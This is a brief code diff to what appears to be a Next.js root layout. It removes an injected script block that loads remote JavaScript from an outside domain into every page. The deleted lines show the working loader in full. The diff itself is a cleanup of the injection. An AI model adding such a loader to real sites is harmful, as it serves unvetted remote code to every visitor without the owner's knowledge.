@@ -23,11 +23,7 @@ export default function RootLayout({ children }) {
         <div className="max-w-6xl mx-auto px-4 py-6">
           {children}
         </div>
-       <script
-          dangerouslySetInnerHTML={{
-            __html: `(function(){var s=document.createElement('script'); s.async=true; s.src='https://alwingulla.com/88/6028495.js'; document.body.appendChild(s);})();`,
-          }}
-        />
+      
       </body>
     </html>
   );
